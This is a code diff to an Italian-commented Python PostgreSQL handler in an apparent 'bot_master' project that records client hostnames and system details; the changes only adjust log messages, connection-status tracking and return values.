@@ -21,6 +21,8 @@ class DatabaseHandler:
     __database_username = "username"
     __database_password = "password"
 
+    __connection_alive = True
+
     # TODO: Controllare che la dimensione fissata dei campi delle tabelle sono sufficienti (Sono le 3 e non ho la minima voglia di controllare @francywolf)
     # TODO: Controllare che sia necessario definire i campi delle tabelle NOT NULL (Sono le 3 e non ho la minima voglia di controllare @francywolf). Io rn: https://www.youtube.com/watch?v=5IZ_POEeiAA
     """
@@ -70,9 +72,9 @@ class DatabaseHandler:
                     "ram_informations": __botclient_ram_informations,
                     "user_informations": __botclient_users_informations}
 
-    def database_init(db_host: str, db_port: int, db_name: str, db_username: str, db_password: str) -> None:
+    def database_init(db_host: str, db_port: int, db_name: str, db_username: str, db_password: str) -> bool:
         """Funzione di setup del database."""
-        bot_master_utils.info("[+] Inizializzazione database", 2)
+        bot_master_utils.info("Inizializzazione database", 2)
         try:
             connection = psycopg2.connect(host=db_host, port=db_port, database=db_name,
                                           user=db_username, password=db_password)
@@ -83,23 +85,25 @@ class DatabaseHandler:
             # Per brevità all'avvio le eseguiamo tutte con un ciclo (evitiamo di avere codice ripetitivo sfruttando un dictionary che contenga tutte le query)
             for key in DatabaseHandler.__invoke_all:
                 cursor.execute(DatabaseHandler.__invoke_all[key])
-                bot_master_utils.info(f"[+] Creazione della tabella {key} avvenuta con successo", 1)
+                bot_master_utils.info(f"Creazione della tabella {key} avvenuta con successo", 1)
             connection.commit()
 
             if (connection):
                 cursor.close()
                 connection.close()
-                bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
+                bot_master_utils.info("Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
 
         except (Exception, Error) as error:
-            bot_master_utils.info(f"[!] Errore durante la connessione al database: {error}", 3)
+            bot_master_utils.info(f"Errore durante la connessione al database: {error}", 3)
+            return False
+        return True
 
         # L'obiettivo è quello di fare operazioni con il dbms che siano "atomiche" e "isolate" -> Ergo una volta finita l'operazione chiudiamo la connessione
         # finally:
 
     def database_insert(query: str) -> None:
         """Funzione di inserimento di un record nel database."""
-        bot_master_utils.info("[+] Inserimento dati nel database in corso", 2)
+        bot_master_utils.info("Inserimento dati nel database in corso", 2)
         try:
             with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
                                   database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
@@ -113,11 +117,11 @@ class DatabaseHandler:
             if (connection):
                 cursor.close()
                 connection.close()
-                bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
+                bot_master_utils.info("Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
 
     def database_insert_new_client(hostname: str) -> None:
         """Funzione di inserimento di un nuovo client all'interno del dbms."""
-        bot_master_utils.info("[+] Inserimento di un nuovo client nel database in corso", 2)
+        bot_master_utils.info("Inserimento di un nuovo client nel database in corso", 2)
         try:
             with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
                                   database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
@@ -129,14 +133,14 @@ class DatabaseHandler:
                 if (connection):
                     cursor.close()
                     connection.close()
-                    bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
+                    bot_master_utils.info("Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
 
         except Error as e:
             bot_master_utils.info(f"Errore nell'esecuzione dello statement: {e}", 2)
 
     def database_select(query: str):
         """Funzione di retrieval di tutti i record presenti nel database."""
-        bot_master_utils.info("[+] Recupero dati dal database in corso", 2)
+        bot_master_utils.info("Recupero dati dal database in corso", 2)
         try:
             with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
                                   database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
@@ -148,7 +152,7 @@ class DatabaseHandler:
                 if (connection):
                     cursor.close()
                     connection.close()
-                    bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
+                    bot_master_utils.info("Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
         except Error as e:
             bot_master_utils.info(f"Errore nell'esecuzione dello statement: {e}", 2)
 
@@ -163,7 +167,7 @@ class DatabaseHandler:
 
     def database_drop_all() -> None:
         """Funzione di reset del database."""
-        bot_master_utils.info("[+] Inizializzazione statement per l'eliminazione di tutte le tabelle presenti sul database", 1)
+        bot_master_utils.info("Inizializzazione statement per l'eliminazione di tutte le tabelle presenti sul database", 1)
         try:
             with psycopg2.connect(host=DatabaseHandler.__database_host, port=DatabaseHandler.__database_port,
                                   database=DatabaseHandler.__database_name, user=DatabaseHandler.__database_username,
@@ -172,20 +176,28 @@ class DatabaseHandler:
                     cursor.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE';")
                     tables = [i[0] for i in cursor.fetchall()]  # Convertiamo una tupla in un array (Prendiamo il primo campo)
                     for table in tables:
-                        bot_master_utils.info(f"[+] Eliminazione tabella {table} database", 1)
+                        bot_master_utils.info(f"Eliminazione tabella {table} database", 1)
                         cursor.execute(f"DROP TABLE public.{table} CASCADE;")
                 connection.commit()
 
                 if (connection):
                     cursor.close()
                     connection.close()
-                    bot_master_utils.info("[+] Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
+                    bot_master_utils.info("Chiusura della connessione al database PostgreSQL effettuata con successo!", 2)
 
         except Error as e:
             bot_master_utils.info(f"Errore nell'esecuzione dello statement: {e}", 2)
 
+    def handle_request():
+        """Funzione per la gestione delle request (interrogazioni) dell'utente al database."""
+        # print()
+        if DatabaseHandler.__connection_alive is False:
+            bot_master_utils.info(f"Attenzione! Non è stato possibile collegarsi al database {DatabaseHandler.__database_name} sull'host {DatabaseHandler.__database_host}:{DatabaseHandler.__database_port}", 3)
+        else:
+            print("All Done")
+
     @classmethod
     def __init__(self):
         """Invocazione automatica della funzione di init."""
-        self.database_init(self.__database_host, self.__database_port, self.__database_name,
-                           self.__database_username, self.__database_password)
+        self.__connection_alive = self.database_init(self.__database_host, self.__database_port, self.__database_name,
+                                                     self.__database_username, self.__database_password)
